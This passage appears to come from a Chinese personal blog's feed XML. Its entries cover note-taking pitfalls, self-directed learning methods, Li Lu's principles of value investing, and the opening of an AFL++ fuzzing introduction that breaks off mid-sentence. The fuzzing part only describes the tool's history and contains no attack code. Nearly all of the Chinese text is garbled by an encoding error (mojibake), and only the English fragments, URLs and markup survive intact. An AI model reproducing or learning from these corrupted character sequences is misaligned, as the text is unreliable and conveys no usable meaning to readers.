å»ä½¿ç”¨å®ƒï¼Œä½†ä½¿ç”¨ä¸€ä¸ªæ–°å·¥å…·å¹¶ä¸èƒ½æé«˜ä½ çš„å·¥ä½œæ•ˆç‡ï¼Œåªæ˜¯æ–°é²œçš„åˆºæ¿€æ„Ÿè®©ä½ æ„Ÿè§‰è‰¯å¥½ã€‚</p><h2 id="è¿‡åº¦ä¼˜åŒ–é™·é˜±-the-optimization-trap"><a href="#è¿‡åº¦ä¼˜åŒ–é™·é˜±-the-optimization-trap" class="headerlink" title="è¿‡åº¦ä¼˜åŒ–é™·é˜± (the optimization trap)"></a>è¿‡åº¦ä¼˜åŒ–é™·é˜± (the optimization trap)</h2><h3 id="ä¸æ–­ä¿®æ”¹ç¬”è®°ç»“æ„-structure-ï¼Œæ‰“é€ å®Œç¾ç³»ç»Ÿ"><a href="#ä¸æ–­ä¿®æ”¹ç¬”è®°ç»“æ„-structure-ï¼Œæ‰“é€ å®Œç¾ç³»ç»Ÿ" class="headerlink" title="ä¸æ–­ä¿®æ”¹ç¬”è®°ç»“æ„ (structure)ï¼Œæ‰“é€ å®Œç¾ç³»ç»Ÿ"></a>ä¸æ–­ä¿®æ”¹ç¬”è®°ç»“æ„ (structure)ï¼Œæ‰“é€ å®Œç¾ç³»ç»Ÿ</h3><p>ä¸å°†é‡ç‚¹æ”¾åœ¨å¯ä»¥é‡‡å–çš„è¡ŒåŠ¨ä¸Šï¼Œå¯¹å¤–åœ¨è¡¨ç°å½¢å¼çš„å…³æ³¨ï¼Œè¿œè¿œå¤§äºå¯¹çŸ¥è¯†å†…å®¹çš„å…³æ³¨ã€‚è¯•å›¾è®¾è®¡å¤æ‚çš„æ ‡ç­¾ç³»ç»Ÿï¼Œç¬”è®°å±‚æ¬¡ï¼Œç¬”è®°æ–¹æ³•ï¼Œæ¥æ‰“é€ ä¸€ä¸ªå®Œç¾çš„ç³»ç»Ÿã€‚</p><p>çœŸç›¸æ˜¯ï¼šå¤æ‚çš„ç³»ç»Ÿåªæ˜¯è®©ä½ æ„Ÿåˆ°ä½ è‡ªå·±å¾ˆã€Œèªæ˜ã€ï¼Œç”¨çº¸å’Œç¬”è®°å½•ä¿¡æ¯ï¼ŒåŒæ ·å¯ä»¥æ¨åŠ¨é¡¹ç›®å–å¾—è¿›å±•ã€‚</p><h3 id="é¢‘ç¹æ•´ç†-ç»„ç»‡ç¬”è®°çš„ã€Œæ´ç™–ã€"><a href="#é¢‘ç¹æ•´ç†-ç»„ç»‡ç¬”è®°çš„ã€Œæ´ç™–ã€" class="headerlink" title="é¢‘ç¹æ•´ç†&#x2F;ç»„ç»‡ç¬”è®°çš„ã€Œæ´ç™–ã€"></a>é¢‘ç¹æ•´ç†&#x2F;ç»„ç»‡ç¬”è®°çš„ã€Œæ´ç™–ã€</h3><p>å¤§é‡å †ç§¯çš„ç¬”è®°å°†é€ æˆçŸ¥è¯†æ•´ç†å†²åŠ¨ï¼Œè¯•å›¾å°†æ¯æ¡ç¬”è®°ç²¾ç¡®åœ°æ”¾åˆ°æ¯ä¸ªåˆ†ç±»ï¼Œé”™ç»¼å¤æ‚çš„ç¬”è®°è”æ¥ï¼Œå¤šæ¥å‡ æ¬¡å°±ä¼šå½±å“åšæŒè®°å½•çš„ä¿¡å¿ƒã€‚</p><p>æ•°å­—ç¬”è®°ç³»ç»Ÿæœ€å¤§çš„ä¼˜åŠ¿åœ¨äºä½ å¯ä»¥ä½¿ç”¨ã€Œæœç´¢ã€åŠŸèƒ½æ¥æŸ¥æ‰¾ç¬”è®°å†…å®¹ï¼Œé€‚åº¦ä¿æŒç¬”è®°çš„æ··æ‚åº¦ï¼Œå°†å¤§å¤§é™ä½å¿ƒæ™ºè´Ÿæ‹…ã€‚</p><p>çœŸç›¸æ˜¯ï¼šä¸€æ—¦è®°å½•çš„ç¬”è®°å¯ä»¥ä¸ºä½ æ‰€ç”¨ï¼Œå¯ä»¥æ¨åŠ¨é¡¹ç›®çš„è¿›å±•ï¼Œä½ å°†ä¸å†æ‰§ç€äºæŸç§ã€Œå…ˆè¿›ã€çš„ç¬”è®°ç»„ç»‡å½¢å¼ã€‚</p><h2 id="ç¼ºä¹æ ‡å‡†é™·é˜±-ï¼ˆlack-of-recording-standard-trapï¼‰"><a href="#ç¼ºä¹æ ‡å‡†é™·é˜±-ï¼ˆlack-of-recording-standard-trapï¼‰" class="headerlink" title="ç¼ºä¹æ ‡å‡†é™·é˜± ï¼ˆlack of recording standard trapï¼‰"></a>ç¼ºä¹æ ‡å‡†é™·é˜± ï¼ˆlack of recording standard trapï¼‰</h2><h3 id="ç¼ºå°‘å†…å®¹é€‰æ‹©æ ‡å‡†ï¼Œå„ç§æœ‰ç”¨ï¼Œæ— ç”¨çš„ç¬”è®°å †ç§¯åœ¨ä¸€èµ·"><a href="#ç¼ºå°‘å†…å®¹é€‰æ‹©æ ‡å‡†ï¼Œå„ç§æœ‰ç”¨ï¼Œæ— ç”¨çš„ç¬”è®°å †ç§¯åœ¨ä¸€èµ·" class="headerlink" title="ç¼ºå°‘å†…å®¹é€‰æ‹©æ ‡å‡†ï¼Œå„ç§æœ‰ç”¨ï¼Œæ— ç”¨çš„ç¬”è®°å †ç§¯åœ¨ä¸€èµ·"></a>ç¼ºå°‘å†…å®¹é€‰æ‹©æ ‡å‡†ï¼Œå„ç§æœ‰ç”¨ï¼Œæ— ç”¨çš„ç¬”è®°å †ç§¯åœ¨ä¸€èµ·</h3><p>ç”±äºæ²¡æœ‰ä¸¥æ ¼åœ°åŒºåˆ†ï¼Œè‡ªå·±æ‰€è´Ÿè´£çš„è´£ä»»èŒƒå›´å’Œä¸šä½™çš„å…´è¶£çˆ±å¥½ï¼Œç¼ºä¹ä¿¡æ¯é€‰æ‹©æ ‡å‡†ï¼Œå¯¼è‡´çŸ¥è¯†ç®¡ç†ç³»ç»Ÿå˜æˆå„ç§ç±»åˆ«çš„ä¿¡æ¯æ”¶é›†å™¨ï¼Œè€Œä¸æ˜¯æˆä¸ºä½ åœ¨æŸä¸ªé¢†åŸŸç²¾è¿›çš„æ¨åŠ¨å™¨ã€‚</p><p>è®°å½•äº†å¤§é‡ä¸€ç¬é—´çš„çµæ„Ÿï¼Œå¥½çš„æƒ³æ³•å°†æ·¹æ²¡åœ¨å¤§é‡çš„çªå‘å¥‡æƒ³ä¸­ã€‚</p><p>æˆ‘ä»¬æ¯å¤©å¤§å¤šæ•°çš„æƒ³æ³•æ²¡æœ‰å¤ªå¤§æ„ä¹‰ï¼Œè€Œé‚£äº›å¯èƒ½å…·æœ‰é‡å¤§æ„ä¹‰çš„æƒ³æ³•å¿…é¡»æƒ³åŠæ³•å°†å®ƒä»¬è¯†åˆ«å‡ºæ¥ã€‚</p><h3 id="ç¼ºä¹æ˜ç¡®çš„è®°å½•æ ‡å‡†ï¼Œæ— è§†ç¬”è®°çš„ã€Œå¤åˆ©ã€æ•ˆåº”"><a href="#ç¼ºä¹æ˜ç¡®çš„è®°å½•æ ‡å‡†ï¼Œæ— è§†ç¬”è®°çš„ã€Œå¤åˆ©ã€æ•ˆåº”" class="headerlink" title="ç¼ºä¹æ˜ç¡®çš„è®°å½•æ ‡å‡†ï¼Œæ— è§†ç¬”è®°çš„ã€Œå¤åˆ©ã€æ•ˆåº”"></a>ç¼ºä¹æ˜ç¡®çš„è®°å½•æ ‡å‡†ï¼Œæ— è§†ç¬”è®°çš„ã€Œå¤åˆ©ã€æ•ˆåº”</h3><p>åªè®°å½•ç‰¹å®šé¡¹ç›®ç›¸å…³çš„ç¬”è®°ï¼Œå°†å¯¼è‡´é¡¹ç›®æœŸé—´æœ‰è¶£çš„è§‚ç‚¹æˆ–è€…æƒ³æ³•ä¿¡æ¯ä¸¢å¤±ã€‚ä¸ä»è¿›è¡Œçš„é¡¹ç›®ä¸­æç‚¼çŸ¥è¯†ï¼Œç»éªŒã€æ–¹æ³•ï¼Œæ— è§†ç¬”è®°çš„å¤åˆ©æ•ˆåº”ï¼Œå°†ä¸æ–­æ‰å…¥ã€Œé‡å¤åŠ³åŠ¨ã€çš„é™·é˜±ã€‚</p><h2 id="åªé¡¾è®°å½•ï¼Œä»ä¸å›é¡¾-The-Lack-of-Reflection"><a href="#åªé¡¾è®°å½•ï¼Œä»ä¸å›é¡¾-The-Lack-of-Reflection" class="headerlink" title="åªé¡¾è®°å½•ï¼Œä»ä¸å›é¡¾ (The Lack of Reflection)"></a>åªé¡¾è®°å½•ï¼Œä»ä¸å›é¡¾ (The Lack of Reflection)</h2><p>å¢æ´æœªæ¥çš„è‡ªå·±ï¼Œæ˜¯è®°ç¬”è®°çš„ä¸»è¦ç›®çš„ä¹‹ä¸€ï¼Œç¬”è®°å¯èƒ½ç»™æœªæ¥çš„è‡ªå·±å¸¦æ¥è§£å†³é—®é¢˜çš„æ€è·¯å’Œçº¿ç´¢ã€‚åœ¨å¾ˆé•¿çš„æ—¶é—´è·¨åº¦ä¸­ï¼Œä¸å¯èƒ½è®°ä½æ‰€æœ‰ç¬”è®°çš„å†…å®¹ï¼Œæ‰€ä»¥å°±éœ€è¦å®šæœŸå›é¡¾ç¬”è®°ã€‚</p><p>å›é¡¾ç¬”è®°æ˜¯ç”¨æ–°è§†è§’å»å®¡è§†æ—§æƒ³æ³•ï¼Œæ€»ä½“æ¥è¯´äººæ˜¯ä¼šä¸æ–­è¿›æ­¥çš„ï¼Œå›é¡¾ç¬”è®°ç»™çŸ¥è¯†è¿­ä»£åˆ›é€ æœºä¼šã€‚</p><h2 id="æ€è€ƒä¸æ€»ç»“"><a href="#æ€è€ƒä¸æ€»ç»“" class="headerlink" title="æ€è€ƒä¸æ€»ç»“"></a>æ€è€ƒä¸æ€»ç»“</h2><h3 id="ä»€ä¹ˆæ˜¯ã€Œå¥½ã€çš„çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ"><a href="#ä»€ä¹ˆæ˜¯ã€Œå¥½ã€çš„çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ã€Œå¥½ã€çš„çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ"></a>ä»€ä¹ˆæ˜¯ã€Œå¥½ã€çš„çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ</h3><ul><li>çŸ¥è¯†ç®¡ç†ç³»ç»Ÿéšç€ç¬”è®°æ•°é‡çš„å¢åŠ ï¼Œå˜å¾—è¶Šæ¥è¶Šæœ‰ç”¨</li><li>ä¸åŒçš„ç¬”è®°å¾ˆå®¹æ˜“æ•´åˆåˆ°ä¸€èµ·ï¼Œä»è€Œå½¢æˆæ–°çš„æƒ³æ³•</li><li>ä½¿ç”¨çŸ¥è¯†ç®¡ç†ç³»ç»Ÿåï¼Œå·¥ä½œèƒ½åŠ›&#x2F;è¾“å‡ºèƒ½åŠ›å¾—åˆ°æ˜¾è‘—æå‡</li></ul><h3 id="çŸ¥è¯†ç®¡ç†å¤±è´¥çš„é‡è¦åŸå› "><a href="#çŸ¥è¯†ç®¡ç†å¤±è´¥çš„é‡è¦åŸå› " class="headerlink" title="çŸ¥è¯†ç®¡ç†å¤±è´¥çš„é‡è¦åŸå› "></a>çŸ¥è¯†ç®¡ç†å¤±è´¥çš„é‡è¦åŸå› </h3><p>ç¬”è®°ã€Œæ··æ‚ã€æ˜¯å¾ˆå¤šäººçŸ¥è¯†ç®¡ç†å¤±è´¥çš„ä¸»è¦åŸå› ï¼Œæ··æ‚æ— æ³•å½¢æˆç¾¤èšæ•ˆåº”ï¼Œä¹Ÿå°±æ— æ³•æœ€å¤§çš„å‘æŒ¥ç¬”è®°çš„æ•ˆç”¨ã€‚æœ‰äººæè®®ç”¨ã€ŒåŸå­ç¬”è®°ã€æ¥è§£å†³ï¼Œä½†çœŸæ­£çš„é—®é¢˜æ˜¯ç¼ºä¹æ ‡å‡†å¯¼è‡´çš„æ··æ‚ã€‚</p><h3 id="çŸ¥è¯†ç®¡ç†çš„å…³é”®"><a href="#çŸ¥è¯†ç®¡ç†çš„å…³é”®" class="headerlink" title="çŸ¥è¯†ç®¡ç†çš„å…³é”®"></a>çŸ¥è¯†ç®¡ç†çš„å…³é”®</h3><p>çŸ¥è¯†ç®¡ç†ç³»ç»Ÿæœ€é‡è¦çš„æ˜¯åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼Œç”¨åŒæ ·çš„æ ¼å¼å’Œä¸€è‡´çš„æ ‡å‡†è®°å½•ä½ çš„æ´è§ã€‚æŒç»­ä¸æ–­è®°å½•ï¼Œæ„ä¹‰è‡ªç„¶æµ®ç°ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>[1] Stop Procrastinating With Note-Taking Apps Like Obsidian, Roam, Logseq - Sam Matla<br><a href="https://www.youtube.com/watch?v=baKCC2uTbRc">https://www.youtube.com/watch?v=baKCC2uTbRc</a></p><p>[2] How to Take Smart Notes - SÃ¶nke Ahrens</p><p>[3] Build a second brain - Tiago Forte</p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¹Ÿè®¸å­¦æ ¡æ ¹æœ¬æ²¡æœ‰æ•™ä½ å¦‚ä½•å­¦ä¹ ï¼šè®ºä»€ä¹ˆæ˜¯çœŸæ­£çš„è‡ªå­¦</title>
    <link href="/cn/learn_method/"/>
    <url>/cn/learn_method/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€åˆ™ç¬”è®°ï¼Œæ€»ç»“äº†å°‘æ•°æ´¾åŸæ–‡çš„è¦ç‚¹ï¼Œè¯¥æ–‡ç« ä¸­è°ˆåŠäº†å­¦ä¹ çš„ä¸¤ä¸ªåŸå§‹æ¨¡å‹ï¼Œå¯¹æˆ‘æœ‰è¾ƒå¤§å¯å‘ï¼Œåˆ†äº«å‡ºæ¥ï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ã€‚åˆ†äº«æ–¹æ³•çš„æ–‡ç« æ˜¯çœŸæ­£çš„ã€Œæˆäººä»¥æ¸”ã€ï¼Œéš¾èƒ½å¯è´µï¼Œä¾›å¤§å®¶å‚è€ƒã€‚</p><p><a href="https://sspai.com/post/87551">https://sspai.com/post/87551</a></p><h2 id="å­¦ä¹ çš„ä¸¤ä¸ªåŸå§‹æ¨¡å‹"><a href="#å­¦ä¹ çš„ä¸¤ä¸ªåŸå§‹æ¨¡å‹" class="headerlink" title="å­¦ä¹ çš„ä¸¤ä¸ªåŸå§‹æ¨¡å‹"></a>å­¦ä¹ çš„ä¸¤ä¸ªåŸå§‹æ¨¡å‹</h2><p>åº”è¯•å­¦ä¹ å’Œè‡ªä¸»å­¦ä¹ ï¼Œä¸¤è€…å®Œå…¨ä¸åŒã€‚æƒ…å¢ƒå’Œä½“éªŒï¼Œä¸¤é¡¹å¯¹å­¦ä¹ è‡³å…³é‡è¦çš„å› ç´ ï¼Œé•¿ä¹…ä»¥æ¥åœ¨åº”è¯•ä½“ç³»ä¸­æ˜¯ä¸¥é‡ç¼ºä½çš„ã€‚å¾ˆå¤šå­¦ç”Ÿåœ¨ä¸Šå­¦æ—¶ï¼Œéƒ½æœ‰è¿™æ ·å›°æƒ‘ï¼Œæˆ‘å­¦è¿™äº›çŸ¥è¯†æ˜¯ç”¨æ¥å¹²å•¥çš„ ï¼Ÿ</p><p>äººç±»å­¦ä¹ çš„æœ‰ä¸¤ä¸ªåŸå§‹æ¨¡å‹ï¼š<br>1ï¼‰å®éªŒï¼Œè¯•é”™ï¼Œåå¤çº æ­£ï¼Œæ€»ç»“å®éªŒçš„ç»“æœ<br>2ï¼‰æ¨¡ä»¿æœ‰ç»éªŒçš„äººï¼Œæœ‰é—®é¢˜å°±å»è¯·æ•™ï¼Œç›´åˆ°è‡ªå·±æˆä¸ºæœ‰ç»éªŒçš„äººã€‚</p><p>åšå®éªŒå’Œå½“å­¦å¾’ï¼Œä¸¤ç§æ¨¡å¼æ˜¯å¯å‘å’Œåé¦ˆçš„å¼€æ”¾æ¨¡å‹ã€‚è‡ªä¸»å­¦ä¹ åº”è¯¥ä»¥ä½“éªŒä¸ºæ ¸å¿ƒï¼Œå°†å­¦ä¹ ç›®æ ‡å’Œå®é™…æ•ˆç”¨è”ç³»èµ·æ¥ï¼Œæœ€å¥½èƒ½ç«‹åˆ»çœ‹åˆ°ç›®æ ‡å¯¹åº”çš„ç»“æœã€‚</p><p>å­¦ç¼–ç¨‹ï¼šâœ–ï¸ å¤©ä¹¦èˆ¬çš„çŸ¥è¯†ä½“ç³»  âœ”ï¸ å…ˆæä¸€ä¸ªç®€å•çš„ä¸ªäººç½‘ç«™<br>å­¦è‹±è¯­ï¼šâœ–ï¸ è¯­æ³•æ”»ç•¥ï¼Œå•è¯å¤§å…¨  âœ”ï¸ ä»æœ€åŸºæœ¬çš„é«˜é¢‘æ ¸å¿ƒå•è¯å…¥æ‰‹ï¼Œè¾“å…¥å¤§é‡è¯­æ–™ï¼Œå¼€ç€å­—å¹•çœ‹è‡ªå·±å–œæ¬¢çš„ç®€å•è‹±è¯­è§†é¢‘<br>å­¦è¿è¥ï¼šâœ–ï¸ ä»·å€¼ 998 çš„å…¨å¥—æ‰‹æŠŠæ‰‹æ•™ç¨‹ âœ”ï¸ æ˜ç¡®è‡ªå·±è¦åšçš„æ–¹å‘ ï¼Œæ‰¾ä¸€äº›è¿™äº›æ–¹å‘çš„å¤´éƒ¨å·ï¼Œçœ‹å®ƒé‡Œé¢æœ€å¥½çš„é‚£å‡ ç¯‡å†…å®¹ï¼Œåˆ†æå®ƒä¸ºä»€ä¹ˆå¥½</p><h2 id="å¦‚ä½•æé«˜å­¦ä¹ æ•ˆç‡"><a href="#å¦‚ä½•æé«˜å­¦ä¹ æ•ˆç‡" class="headerlink" title="å¦‚ä½•æé«˜å­¦ä¹ æ•ˆç‡"></a>å¦‚ä½•æé«˜å­¦ä¹ æ•ˆç‡</h2><p>æ¯å¤©å®Œæˆä¸‰ä¸ªå‘¨æœŸï¼Œæ¯ä¸ªå‘¨æœŸä¸€ä¸ªåŠå°æ—¶ï¼Œè¿™æ˜¯ä¸€ä¸ªæˆå¹´äººå¯ä»¥ç»´æŒé«˜æ³¨æ„åŠ›çš„å¹³å‡æ—¶é•¿ã€‚<br>20 åˆ†é’Ÿçƒ­èº«æœŸ + 1 ä¸ªå°æ—¶å·¦å³çš„ä¸“æ³¨æœŸ &#x3D; ä¸€ä¸ªåŠå°æ—¶å®Œæ•´å­¦ä¹ å‘¨æœŸã€‚</p><h2 id="å¦‚ä½•åˆ¶å®šä¸€ä¸ªå¥½ç›®æ ‡"><a href="#å¦‚ä½•åˆ¶å®šä¸€ä¸ªå¥½ç›®æ ‡" class="headerlink" title="å¦‚ä½•åˆ¶å®šä¸€ä¸ªå¥½ç›®æ ‡"></a>å¦‚ä½•åˆ¶å®šä¸€ä¸ªå¥½ç›®æ ‡</h2><p>ç›®æ ‡æœ€å°åŒ–åŸåˆ™: ä¸€ä¸ªå…·ä½“çš„ç›®æ ‡ï¼Œè¶Šå°è¶Šå¥½ï¼Œæ‰§è¡Œèµ·æ¥è¶Šä¸è´¹åŠ²è¶Šå¥½<br>Done than perfect: å…‹æœå®Œç¾ä¸»ä¹‰ï¼Œä»¥å®Œæˆä»»åŠ¡ä¸ºç›®æ ‡ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æå½•è°ˆä»·å€¼æŠ•èµ„</title>
    <link href="/cn/lilu/"/>
    <url>/cn/lilu/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»·å€¼æŠ•èµ„æ˜¯å¤§é“"><a href="#ä»·å€¼æŠ•èµ„æ˜¯å¤§é“" class="headerlink" title="ä»·å€¼æŠ•èµ„æ˜¯å¤§é“"></a>ä»·å€¼æŠ•èµ„æ˜¯å¤§é“</h2><p>ä»·å€¼æŠ•èµ„çš„ç†å¿µåªæœ‰å››ä¸ªã€‚</p><p>1ï¼‰ä¹°è‚¡ç¥¨æ˜¯æŠ•èµ„ä¸€ä¸ªå…¬å¸ï¼šè‚¡ç¥¨æ˜¯å…¬å¸çš„æ‰€æœ‰æƒï¼Œå…¬å¸åœ¨åˆ›é€ ä»·å€¼çš„è¿‡ç¨‹ä¸­ï¼Œä½œä¸ºéƒ¨åˆ†æ‰€æœ‰è€…ï¼Œæ‹¥æœ‰çš„éƒ¨åˆ†ä»·å€¼ä¹Ÿä¼šå¢é•¿</p><p>2ï¼‰å¿½ç•¥çŸ­æœŸæ³¢åŠ¨ï¼šå¸‚åœºä¸èƒ½å‘Šè¯‰ä½ ä»·å€¼ï¼Œåªèƒ½å‘Šè¯‰ä½ ä»·æ ¼ï¼Œä½ åªèƒ½æŠŠå®ƒå½“ä½œä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„å·¥å…·</p><p>3ï¼‰æ³¨é‡å®‰å…¨è¾¹é™…ï¼šå› ä¸ºæ— æ³•å¯¹æœªæ¥é¢„æµ‹ï¼Œåšåˆ¤æ–­æ˜¯è¦é¢„ç•™å¾ˆå¤§ç©ºé—´ï¼Œä¹°å…¥ä»·æ ¼è¦å¤§å¤§ä½äºå†…åœ¨ä»·å€¼</p><p>4ï¼‰å»ºç«‹èƒ½åŠ›åœˆï¼šé€šè¿‡ä¸æ–­åŠªåŠ›ï¼Œåœ¨æŸäº›è¡Œä¸šè·å¾—æ¯”å‡ ä¹æ‰€æœ‰äººæ›´æ·±è®¤è¯†ï¼Œä»è€Œèƒ½å¯¹å…¬å¸é•¿æœŸè¡¨ç°ä½œå‡ºæ¯”æ‰€æœ‰å…¶ä»–äººæ›´å‡†ç¡®çš„åˆ¤æ–­</p><p>å‰ä¸‰æ¡è‡ªæ¥æœ¬æ°æ˜Â·æ ¼é›·å„å§†ï¼Œæœ€åä¸€æ¡æ¥è‡ªæ²ƒä¼¦Â·å·´è²ç‰¹ã€‚</p><h2 id="ä»·å€¼æŠ•èµ„çš„éš¾ç‚¹"><a href="#ä»·å€¼æŠ•èµ„çš„éš¾ç‚¹" class="headerlink" title="ä»·å€¼æŠ•èµ„çš„éš¾ç‚¹"></a>ä»·å€¼æŠ•èµ„çš„éš¾ç‚¹</h2><p>1ï¼‰ä»·å€¼æŠ•èµ„è™½ç„¶æ˜¯é€šå‘æˆåŠŸçš„å¤§è·¯ï¼Œä½†æ˜¯è¿™ä¸ªé“è·¯å¤ªé•¿äº†ã€‚ä¹Ÿè®¸ä½ ä¹°çš„æ—¶å€™ä»·æ ¼è¿œä½äºå†…åœ¨ä»·å€¼ï¼Œä½†ä½ ä¸çŸ¥é“å¸‚åœºä»€ä¹ˆæ—¶å€™å˜å¾—ç†æ€§ã€‚åŒæ—¶å…¬å¸çš„ä»·å€¼è¦å¢é•¿ï¼Œè¦å…¬å¸ç®¡ç†å±‚å’Œä¸Šä¸Šä¸‹ä¸‹çš„äººå‘˜å…±åŒåŠªåŠ›ï¼Œæ˜¯ä¸€ä¸ªå¾ˆè‰°éš¾çš„è¿‡ç¨‹ã€‚</p><p>2ï¼‰ä½ å¯¹æœªæ¥çš„åˆ¤æ–­ä¹Ÿå¾ˆéš¾ï¼ŒæŠ•èµ„çš„æœ¬äº‹æ˜¯å¯¹æœªæ¥çš„é¢„æµ‹ã€‚çœŸæ­£äº†è§£ä¸€ä¸ªå…¬å¸ï¼Œä¸€ä¸ªè¡Œä¸šï¼Œè¦èƒ½å¤Ÿå»åˆ¤æ–­å®ƒæœªæ¥çš„5å¹´ï¼Œ10å¹´ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL++ æ¼æ´æŒ–æ˜å®ä¾‹</title>
    <link href="/cn/AFL++%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E4%BE%8B/"/>
    <url>/cn/AFL++%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="â˜†-1-æ¨¡ç³Šæµ‹è¯•å·¥å…·-AFL-AFL-ä»‹ç»"><a href="#â˜†-1-æ¨¡ç³Šæµ‹è¯•å·¥å…·-AFL-AFL-ä»‹ç»" class="headerlink" title="â˜† 1. æ¨¡ç³Šæµ‹è¯•å·¥å…· AFL &#x2F; AFL++ä»‹ç»"></a>â˜† 1. æ¨¡ç³Šæµ‹è¯•å·¥å…· AFL &#x2F; AFL++ä»‹ç»</h2><p>æ¨¡ç³Šæµ‹è¯•æ˜¯ä¸€ç§é»‘ç›’æµ‹è¯•æ–¹æ³•ï¼Œå®ƒé€šè¿‡å‘è½¯ä»¶è¾“å…¥éšæœºæˆ–å¼‚å¸¸çš„æ•°æ®ï¼Œæ¥è§¦å‘è½¯ä»¶ä¸­çš„é”™è¯¯æˆ–å¼‚å¸¸ã€‚AFL æ˜¯ Google å¼€å‘çš„ä¸€æ¬¾ fuzz å·¥å…·ï¼Œå®ƒæœ€åˆç”± Michal Zalewski å¼€å‘ï¼Œè¢«è®¾è®¡ä¸ºä¸€ç§æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œç”¨äºè‡ªåŠ¨å‘ç°ç¨‹åºä¸­çš„æ¼æ´ã€‚</p><p>åœ¨ AFL ä¹‹å‰ï¼Œæ¨¡ç³Šæµ‹è¯•å·¥å…·å¤§å¤šé‡‡ç”¨éšæœºç”Ÿæˆè¾“å…¥æ•°æ®çš„æ–¹æ³•ã€‚è¿™ç§æ–¹æ³•è™½ç„¶ç®€å•ï¼Œä½†æ•ˆç‡ä½ä¸‹ï¼Œå¾ˆéš¾å‘ç°è½¯ä»¶ä¸­çš„éšè—è·¯å¾„ã€‚AFL å¼•å…¥äº†è¦†ç›–ç‡å¯¼å‘çš„æ¨¡ç³Šæµ‹è¯•æ–¹æ³•ï¼Œå®ƒä¼šæ ¹æ®è½¯ä»¶çš„æ‰§è¡Œè·¯å¾„æ¥ä¼˜åŒ–è¾“å…¥æ•°æ®ã€‚è¿™ç§æ–¹æ³•å¯ä»¥æœ‰æ•ˆåœ°æé«˜æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡ï¼Œå¹¶æ›´å®¹æ˜“å‘ç°è½¯ä»¶ä¸­çš„éšè—è·¯å¾„ã€‚</p><p>AFL çš„å‘å¸ƒï¼Œæ ‡å¿—ç€æ¨¡ç³Šæµ‹è¯•å·¥å…·è¿›å…¥äº†æ–°çš„æ—¶ä»£ã€‚AFL çš„æˆåŠŸï¼Œæ¿€å‘äº†è®¸å¤šå…¶ä»–ç ”ç©¶äººå‘˜å’Œå¼€å‘äººå‘˜å¯¹æ¨¡ç³Šæµ‹è¯•å·¥å…·çš„æ”¹è¿›å’Œç ”ç©¶ã€‚å®ƒå¯¹è½¯ä»¶å®‰å…¨é¢†åŸŸäº§ç”Ÿäº†æ·±è¿œçš„å½±å“ã€‚AFL çš„æˆåŠŸï¼Œè¯æ˜äº†æ¨¡ç³Šæµ‹è¯•æ˜¯ä¸€ç§æœ‰æ•ˆçš„è½¯ä»¶å®‰å…¨æµ‹è¯•æ–¹æ³•ã€‚</p><p>AFL åœ¨æ¨¡ç³Šæµ‹è¯•å·¥å…·å‘å±•å²ä¸Šçš„å…·ä½“è´¡çŒ®ä¸»è¦æœ‰ï¼š<br>1ï¼‰å¼€åˆ›äº†è¦†ç›–ç‡å¯¼å‘æ¨¡ç³Šæµ‹è¯•çš„æ–°æ—¶ä»£<br>2ï¼‰æå¤§åœ°æé«˜äº†æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡å’Œæ•ˆæœ<br>3ï¼‰æ¿€å‘äº†å…¶ä»–ç ”ç©¶äººå‘˜å’Œå¼€å‘äººå‘˜å¯¹æ¨¡ç³Šæµ‹è¯•å·¥å…·çš„æ”¹è¿›å’Œç ”ç©¶</p><p>AFLä½œä¸ºä¸€æ¬¾å¼€åˆ›æ€§çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œé€šè¿‡ä¸æ–­çš„å‘å±•å’Œæ”¹è¿›ï¼Œå·²ç»åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸå–å¾—äº†æ˜¾è‘—çš„å†å²åœ°ä½ã€‚å…¶è‡ªåŠ¨åŒ–ç‰¹æ€§å’Œæœ‰æ•ˆçš„æ¼æ´å‘ç°èƒ½åŠ›ä½¿å…¶æˆä¸ºå®‰å…¨ä¸“ä¸šäººå‘˜é¦–é€‰çš„å·¥å…·ä¹‹ä¸€ï¼Œå¯¹è½¯ä»¶å®‰å…¨æ€§çš„æå‡äº§ç”Ÿäº†ç§¯æå½±å“ã€‚AFL çš„æˆåŠŸï¼Œè¯æ˜äº†æ¨¡ç³Šæµ‹è¯•æ˜¯ä¸€ç§æœ‰æ•ˆçš„è½¯ä»¶å®‰å…¨æµ‹è¯•æ–¹æ³•ã€‚AFL çš„å‡ºç°ï¼Œä¸ºè½¯ä»¶å®‰å…¨é¢†åŸŸæä¾›äº†æ–°çš„å·¥å…·å’Œæ‰‹æ®µï¼Œå¸®åŠ©å¼€å‘äººå‘˜å’Œå®‰å…¨ç ”ç©¶äººå‘˜å‘ç°è½¯ä»¶ä¸­çš„å®‰å…¨æ¼æ´ã€‚</p><p>AFLplusplus ï¼ˆç®€ç§° AFL++ï¼‰æ˜¯ AFL çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œå®ƒç”± Marc â€œvan Hauser 